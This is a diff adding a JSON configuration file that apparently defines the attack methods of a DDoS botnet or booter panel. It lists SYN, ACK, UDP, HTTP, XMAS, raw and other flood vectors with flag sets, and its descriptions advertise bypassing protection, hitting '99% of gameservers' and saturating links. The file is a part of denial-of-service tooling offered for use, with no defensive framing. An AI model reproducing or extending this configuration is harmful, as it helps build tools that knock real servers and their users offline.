@@ -1,0 +1,61 @@
+{
+	"Vectors":[
+	    {
+	    	"Name":".syn",
+	    	"type":0,
+	    	"flags":[ 2, 3, 4, 5, 6, 7, 11, 12, 13, 14, 15, 16, 17, 18, 25 ],
+	    	"Description":"TCP based flood with the syn flag set to true great for unconfigured webservers"
+        },
+        {
+	    	"Name":".ack",
+	    	"type":1,
+	    	"flags":[ 0, 1, 2, 3, 4, 5, 6, 7, 11, 12, 13, 14, 15, 16, 17, 18, 25 ],
+	    	"Description":"TCP based flood with the ack flag set to true great for webservers/servers with a tcp port open"
+        },
+        {
+	    	"Name":".udpplain",
+	    	"type":2,
+	    	"flags":[0, 1, 6,7],
+	    	"Description":"a simple but strong udp based flood able of sending very high pps"
+        },
+        {
+	    	"Name":".http",
+	    	"type":3,
+	    	"flags":[8, 7, 20, 21, 22, 24],
+	    	"Description":"A Layer 7 HTTP flood able of bypassing high quality protection if the flags are set correctly"
+        },
+        {
+	    	"Name":".xmas",
+	    	"type":4,
+	    	"flags":[ 0, 1, 2, 3, 4, 5, 7, 11, 12, 13, 14, 15, 16 ],
+	    	"Description":"A TCP Based flood with the ack,syn,psh,fin flags set to true great for bypassing some hosts"
+        },
+        {
+	    	"Name":".std",
+	    	"type":6,
+	    	"flags":[0,1,6,7],
+	    	"Description":"A Strong but stable udp method able to hit 99% of gameservers"
+	    },
+		{
+			"Name":".socket",
+			"type":13,
+			"flags":[],
+			"Description":"A tcp socket connection flood."
+		},
+		{
+			"Name":".hex",
+			"type":11,
+			"flags":[6,7,0,1],
+			"Description":"A udp hex flood made for bypassing."
+		},
+		{
+			"Name":".raw",
+			"type":14,
+			"flags":[0,1,2,3, 4,5, 6,7,19,25],
+			"Description":"A Raw packet udp flood capable of saturating the highest port speeds."
+		}
+	],
+	"APIVectors":[
+		
+	]
+}
